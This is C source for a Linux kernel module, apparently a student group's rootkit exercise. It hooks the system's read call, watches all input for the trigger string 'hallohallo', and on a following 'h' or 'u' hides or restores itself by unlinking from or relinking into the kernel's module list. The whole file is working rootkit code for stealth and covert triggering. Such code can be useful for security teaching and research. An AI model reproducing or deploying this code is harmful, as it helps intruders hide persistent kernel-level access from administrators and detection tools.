#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
//#include <linux/sched.h>
//#include <linux/list.h>


#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hook_read.h"


char activate_pattern[] = "hallohallo";
int size_of_pattern = sizeof(activate_pattern)-1;
int cur_position = 0;
int last_match = -1;
int hidden = 0;

struct list_head tos;

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);


/*
 * Hiding a module is basically just removing it from the list of modules
 */
void hide_me(void)
{
    struct list_head *prev;
    struct list_head *next;
    if(hidden == 1)
        return;
    prev = THIS_MODULE->list.prev;
    next = THIS_MODULE->list.next;
    prev->next = next;
    next->prev = prev;
    hidden = 1;
}


void unhide_me(void)
{
    struct list_head *mods;
    struct list_head *this_list_head;
    if(hidden == 0)
        return;

    mods = (struct list_head *) ptr_modules;
    this_list_head = &THIS_MODULE->list;


    //insert this module into the list of modules (to the front)
    mods->next->prev = this_list_head; // let prev of the (former) first module point to us
    this_list_head->next = mods->next; // let our next pointer point to the former first module

    mods->next = this_list_head; // let the modules list next pointer point to us
    this_list_head->prev = mods; // let out prev pointer point to the modules list

    hidden = 0;
}

static void handleChar(char c){
    if(c=='\n' || c == '\r'){ //cancel command with newline
//        OUR_DEBUG("newline");
        last_match = -1;
        cur_position = 0;
    } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
        if(c == 'h'){ //hide
            OUR_DEBUG("HIDE THIS MODULE");
            hide_me();
            last_match = -1;
            cur_position = 0;
        } else if(c == 'u') { //unhide
            OUR_DEBUG("UNHIDE THIS MODULE");
            unhide_me();
            last_match = -1;
            cur_position = 0;
        } else {
            //ignore everything else and wait for a valid command
        }
    } else if(last_match+1 == cur_position){ // activate_pattern matched until last_match, now we compare with last_match + 1
        if(c == activate_pattern[cur_position]) { // match further
//            OUR_DEBUG("match %c", c);
            last_match++;
            cur_position++;
        } else if(c == '\b') { // backspace (why would one want to do this is this case?)
//            OUR_DEBUG("backspace but right");
            last_match--;
            cur_position--;
        } else { // wrong char
//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
            cur_position++;
        }
    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
        if(c == '\b'){
//            OUR_DEBUG("backspace wrong");
            cur_position--;
        } else {
//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
            cur_position++;
        }
    }
}

static void handle_input(char *buf, int count)
{
    int i;
    for(i = 0; i<count; i++){
        handleChar(buf[i]);
    }
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6. %d\n", size_of_pattern);
    hook_read(handle_input);


    //hide_me();

    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_read();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);